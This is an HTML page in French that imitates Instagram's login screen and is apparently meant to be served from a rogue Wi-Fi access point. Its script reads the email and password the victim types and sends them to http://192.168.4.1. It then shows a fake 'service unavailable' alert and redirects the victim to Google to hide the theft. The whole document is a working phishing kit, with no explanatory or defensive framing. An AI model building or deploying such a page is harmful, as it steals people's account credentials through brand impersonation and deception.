    <meta charset="UTF-8">
    <title>Page de Connexion Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-form {
            background: #FFFFFF;
            padding: 20px;
            border: 1px solid #dbdbdb;
            text-align: center;
            width: 350px;
        }

        .login-logo {
            margin-bottom: 20px;
        }

        .form-control {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px;
            margin: 0 40px 6px;
            width: calc(100% - 80px);
        }

        .btn {
            background-color: #0095f6;
            border: none;
            color: #ffffff;
            cursor: pointer;
            font-weight: 600;
            text-transform: uppercase;
            padding: 5px;
            margin: 8px 40px;
            width: calc(100% - 80px);
            border-radius: 4px;
        }

        .login-footer {
            color: #262626;
            font-size: 14px;
            margin: 10px 0;
        }

        .login-link {
            color: #00376b;
            text-decoration: none;
            font-weight: 600;
        }

        .divider {
            color: #dbdbdb;
            margin: 10px 40px;
            position: relative;
        }

        .divider:before, .divider:after {
            content: "";
            background-color: #dbdbdb;
            height: 1px;
            position: absolute;
            top: 50%;
            width: 40%;
        }

        .divider:before {
            right: 50%;
            margin-right: 10px;
        }

        .divider:after {
            left: 50%;
            margin-left: 10px;
        }

        .or {
            display: inline-block;
            background: #FFFFFF;
            padding: 0 10px;
            position: relative;
            z-index: 1;
        }

        .other-options {
            margin-top: 18px;
        }

        .signup-footer {
            color: #262626;
            font-size: 14px;
            margin: 20px;
        }

        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .app-download {
            margin-top: 10px;
        }

        .app-store-badge {
            height: 40px;
            margin: 5px;
        }
    </style>
</head>

        <input type="text" id="email" class="form-control" placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail">
        <input type="password" id="password" class="form-control" placeholder="Mot de passe">
        <button onclick="sendCredentials()" class="btn">Se connecter</button>
        <div class="login-footer">
            <a href="#" class="login-link">Mot de passe oublié ?</a>

    <script>
        function sendCredentials() { 	
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            
            getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
            alert("Service indisponible.");
            window.location.href = "https://www.google.com";
        }

        function getFile(url) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);
            xhr.send();
        }
    </script>
